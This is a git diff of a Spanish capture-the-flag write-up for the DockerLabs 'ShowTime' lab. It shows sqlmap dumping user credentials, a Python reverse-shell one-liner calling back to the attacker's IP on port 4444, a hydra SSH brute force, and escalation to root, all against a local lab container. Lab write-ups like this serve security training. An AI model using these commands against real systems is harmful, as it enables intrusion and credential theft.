@@ -1,6 +1,6 @@
 ---
-title: DockerLabs - Showtime
-summary: "Write-up del laboratorio Showtime de DockerLabs"
+title: DockerLabs - ShowTime
+summary: "Write-up del laboratorio ShowTime de DockerLabs"
 author: elcybercurioso
 date: 2025-11-09
 categories: [Post, DockerLabs]
@@ -48,12 +48,12 @@ Haciendo algunas pruebas, nos damos cuenta de que es vulnerable a una inyección
 
 ![Desktop View](/20251109134917.webp){: width="410" height="330" .shadow}
 
-## explotación
+## explotación SQLi
 
 Debido a esto, podemos extraer información de la base de datos empleando `sqlmap`, y una petición que hayamos interceptado con Burp Suite y la hayamos guardado en un fichero .txt:
 
 ```bash
-┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ShowTime]
 └─$ sqlmap -r request.txt --dbs --batch                                           
         ___
        __H__
@@ -83,7 +83,7 @@ available databases [5]:
 Una vez obtenidas las bases de datos existentes, procedemos a obtener las tablas de la base de datos `users`, la cual parece ser la que va a contener información interesante:
 
 ```bash
-┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ShowTime]
 └─$ sqlmap -r request.txt -D users --tables --batch
         ___
        __H__                                                                                                                                                            
@@ -108,7 +108,7 @@ Database: users
 Sabemos que la base de datos es `users`, y la única tabla existente es `usuarios`, pero nos faltan las columnas de dicha tabla:
 
 ```bash
-┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ShowTime]
 └─$ sqlmap -r request.txt -D users -T usuarios --columns --batch
         ___
        __H__
@@ -139,7 +139,7 @@ Table: usuarios
 Una vez tenemos toda esta información, podemos extraer los datos que nos interesa, que en este caso son los usuarios y la contraseñas, las cuales podríamos llegar a reutilizar en otros servicios:
 
 ```bash
-┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ShowTime]
 └─$ sqlmap -r request.txt -D users -T usuarios -C username,password --dump --batch
         ___
        __H__                                                                                                                                                            
@@ -173,11 +173,11 @@ Table: usuarios
 
 ## acceso inicial (www-data)
 
-Revisando las credenciales que hemos encontrado, vemos que al loguearnos como `joe`, nos encontramos con una funcionalidad que permite ejecutar comandos en Python:
+Revisando las credenciales que hemos encontrado, vemos que al loguearnos como `joe` en el panel de autenticación de la página, nos encontramos con una funcionalidad que permite ejecutar comandos en Python:
 
 ![Desktop View](/20251109135929.webp){: width="410" height="330" .shadow}
 
-Si no existen filtros aplicados a esta ejecución, nos podemos entablar una conexión reversa para obtener una consola remota empleando el siguiente comando (sin olvidarnos primero de ponernos en escucha, por ejemplo, con `nc`):
+Si no existen filtros aplicados a esta ejecución, nos podemos entablar una conexión reversa para obtener una consola remota empleando el siguiente comando (sin olvidarnos primero de ponernos en escucha, por ejemplo, con **nc** por el puerto **4444**):
 
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<nuestra IP>",<nuestro puerto>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
@@ -186,7 +186,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 Una vez ejecutado el comando, veremos que habremos obtenido una conexión en la máquina:
 
 ```bash
-┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ShowTime]
 └─$ nc -nlvp 4444                     
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38440
@@ -207,7 +207,7 @@ Script started, output log file is '/dev/null'.
 www-data@51b14e55adbd:/var/www/html/login_page$ ^Z
 zsh: suspended  nc -nlvp 4444
                                                                                                                                                                         
-┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ShowTime]
 └─$ stty raw -echo;fg                                                        
 [1]  + continued  nc -nlvp 4444
                                reset xterm 
@@ -262,14 +262,14 @@ Tratamos de ver si alguno de estos códigos es la contraseña del usuario `joe` 
 Por ello, probamos a convertir todos los códigos a minúsculas, y volvemos a probar:
 
 ```bash
-┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ShowTime]
 └─$ cat passwords.txt | tr '[:upper:]' '[:lower:]' > lower_passwords.txt
 ```
 
 Esta vez, encontramos que uno de los códigos es en efecto la contraseña del usuario `joe`:
 
 ```bash
-┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ShowTime]
 └─$ hydra -L users.txt -P lower_passwords.txt ssh://172.17.0.2 -I -t 64
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -286,7 +286,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-09 13:17:
 Nos conectamos como `joe`:
 
 ```bash
-┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ShowTime]
 └─$ ssh joe@172.17.0.2  
 joe@172.17.0.2`s password: 
 joe@51b14e55adbd:~$ whoami
@@ -366,7 +366,7 @@ bash-5.2# whoami
 root
 ```
 
-De esta manera, habremos completado la máquina Showtime!
+De esta manera, habremos completado la máquina ShowTime!
 
 <a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>
 
